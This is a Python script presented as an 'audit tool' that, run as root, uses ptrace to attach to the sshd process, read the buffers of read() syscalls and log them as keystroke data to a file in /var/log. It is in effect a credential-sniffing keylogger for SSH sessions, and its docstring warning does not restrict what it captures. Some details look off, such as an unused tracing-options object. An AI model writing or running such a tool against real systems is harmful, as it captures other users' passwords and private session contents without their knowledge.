#!/usr/bin/env python3
"""
Security audit tool for monitoring sshd keystrokes.
WARNING: This tool should only be used on systems you own or have explicit permission to audit.
"""

import os
import sys
import time
import signal
import logging
from datetime import datetime

try:
    import ptrace
    from ptrace.debugger import PtraceDebugger, ProcessSignal
    from ptrace.func_call import FunctionCallOptions
except ImportError:
    print("Error: ptrace library not installed. Install with: pip install python-ptrace")
    sys.exit(1)

# Configure logging
LOG_FILE = "/var/log/sshd_keystroke_audit.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

def find_sshd_pid():
    """Find the PID of the running sshd process."""
    try:
        with open("/var/run/sshd.pid", "r") as f:
            pid = int(f.read().strip())
        return pid
    except (FileNotFoundError, ValueError):
        print("Error: Could not find sshd PID")
        sys.exit(1)

def attach_and_monitor(pid):
    """Attach to sshd process and log keystrokes."""
    debugger = PtraceDebugger()
    
    try:
        process = debugger.addProcess(pid, is_attached=True)
        print(f"[*] Attached to sshd process (PID: {pid})")
        logging.info(f"Started monitoring sshd process (PID: {pid})")
        
        # Set up function call tracing for read() syscalls
        options = FunctionCallOptions(
            write_types=True,
            write_argname=True,
            max_array_count=256
        )
        
        while True:
            try:
                # Wait for syscall events
                process.waitSyscall()
                
                # Check if it's a read syscall (number 0 on x86_64)
                if process.syscall_nr == 0:
                    # Extract the buffer content
                    buf_addr = process.getSyscallArgument(1)
                    buf_size = process.getSyscallArgument(2)
                    
                    if buf_size > 0 and buf_size < 4096:
                        # Read the buffer content
                        data = process.readMemory(buf_addr, buf_size)
                        if data:
                            # Log the keystrokes
                            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            logging.info(f"Keystroke data: {data}")
                            print(f"[{timestamp}] Captured: {data[:50]}...")
                
                # Continue execution
                process.syscall()
                
            except ProcessSignal as sig:
                if sig.signum == signal.SIGCHLD:
                    continue
                else:
                    break
                    
    except ptrace.error.PtraceError as e:
        print(f"[!] Ptrace error: {e}")
        logging.error(f"Ptrace error: {e}")
    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped by user")
    finally:
        debugger.quit()
        logging.info("Monitoring stopped")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Error: This script must be run as root")
        sys.exit(1)
    
    print("[*] SSH Keystroke Audit Tool")
    print("[*] Starting monitoring...")
    
    pid = find_sshd_pid()
    attach_and_monitor(pid)